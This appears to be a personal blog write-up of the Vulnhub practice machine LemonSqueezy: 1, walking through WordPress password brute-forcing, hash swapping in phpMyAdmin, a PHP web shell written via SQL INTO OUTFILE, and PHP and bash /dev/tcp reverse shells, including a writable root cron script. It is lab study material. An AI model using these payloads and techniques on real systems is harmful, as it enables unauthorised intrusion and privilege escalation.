---
layout: post
title:  "Vulnhub - LemonSqueezy: 1"
date:   2020-10-10 20:00:00 +1000
category: hacking
---

## Introduction
*This is a beginner boot2root in a similar style to ones I personally enjoy like Mr Robot, Lazysysadmin and MERCY.*

*This is a VMware machine. DHCP is enabled, add lemonsqueezy to your hosts. It’s easypeasy!*

This box is on the [NetSecFocus Admin list](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0) of OSCP-like machines. It's [LEMONSQUEEZY: 1](https://www.vulnhub.com/entry/lemonsqueezy-1,473/) from vulnhub.

## Ports
We've got one port only; HTTP on 80.

## HTTP
So with a quick *gobuster* fishing expedition we find a couple of interesting things - in particular, *wordpress* and *phpMyAdmin*. 

Running wpscan gets us two users, *lemon* and *orange*. A password attack gets an easy win:

{% highlight shell %}
root@kali:/opt/vulnhub/lemonsqueezy# wpscan --url http://192.168.1.98/wordpress -U 'lemon,orange' -P /usr/share/wordlists/rockyou.txt 
[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - orange / ginger
{% endhighlight %}

Using these credentials we can log in to Wordpress, but *orange* is not an admin. However we can find a post called *Keep this safe!* which contains a password: **n0t1n@w0rdl1st!**.

With this, we can login to *phpMyAdmin* as *orange*. Once there, we can grab the hash for *lemon* and try to crack it with Hashcat - it doesn't work easily. So instead we can change it to the same hash as used by *orange*, because we know this is *ginger*. Once we've done that we can log in to Wordpress as *lemon*.

## Wordpress
Normally we could run some PHP code in wordpress in a few different ways. We could edit an existing plugin, we could upload a new (malicious) plugin, or we could edit the PHP code of an existing theme. Unfortunately, none of these work because the temporary upload folder hasn't been set in *wp-config.php* - and we can't change it. What's more, the existing plugin and theme files are all set as non-editable. Again, something we can't change from the dashboard. Now what?

## phpMyAdmin
Back in phpMyAdmin, we can create a new table and then run this SQL on it:

``
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/wordpress/wp-content/uploads/test.php" 
``

Once we've done that, we can visit http://lemonsqueezy/wordpress/wp-content/uploads/test.php and run commands - finally, RCE! Note that I did also set the *uploads* directory in wp-options in phpMyAdmin but I don't know if this was actually necessary or not.

This one gets me a shell:

``
http://lemonsqueezy/wordpress/wp-content/uploads/test.php?cmd=php+-r+%27$sock%3dfsockopen(%22192.168.1.77%22,1234)%3bexec(%22/bin/sh+-i+%3C%263+%3E%263+2%3E%263%22)%3b%27
``

## On the box
Running *linpeas.sh* shows a cronjob of interest:

{% highlight shell %}
www-data@lemonsqueezy:/dev/shm$ cat /etc/crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    /etc/logrotate.d/logrotate
#
{% endhighlight %}

So this sure looks like a candidate for the *logrotten* exploit, right? But first let's just check the contents:

{% highlight shell %}
www-data@lemonsqueezy:/dev/shm$ cat /etc/logrotate.d/logrotate
cat /etc/logrotate.d/logrotate
#!/usr/bin/env python
import os
import sys
try:
   os.system('rm -r /tmp/* ')
except:
    sys.exit()
{% endhighlight %}

Ah! Shenanigans! Well it's fine, because we can write to the file. Let's replace the contents:

{% highlight shell %}
www-data@lemonsqueezy:/dev/shm$ printf '#!/bin/bash\nbash -i >& /dev/tcp/192.168.1.77/1235 0>&1\n' > /etc/logrotate.d/logrotate
<.168.1.77/1235 0>&1\n' > /etc/logrotate.d/logrotate
www-data@lemonsqueezy:/dev/shm$ cat /etc/logrotate.d/logrotate
cat /etc/logrotate.d/logrotate
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.77/1235 0>&1
{% endhighlight %}

And now we wait ....

## Root

{% highlight shell %}
root@kali:/opt/vulnhub/lemonsqueezy# nc -nvlp 1235
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1235
Ncat: Listening on 0.0.0.0:1235
Ncat: Connection from 192.168.1.98.
Ncat: Connection from 192.168.1.98:35102.
bash: cannot set terminal process group (23760): Inappropriate ioctl for device
bash: no job control in this shell
root@lemonsqueezy:~# cd /root/
root@lemonsqueezy:~# cat root.txt
cat root.txt
NvbWV0aW1lcyBhZ2FpbnN0IHlvdXIgd2lsbC4=
{% endhighlight %}

I enjoyed this one and learned some little tricks. Nice one.
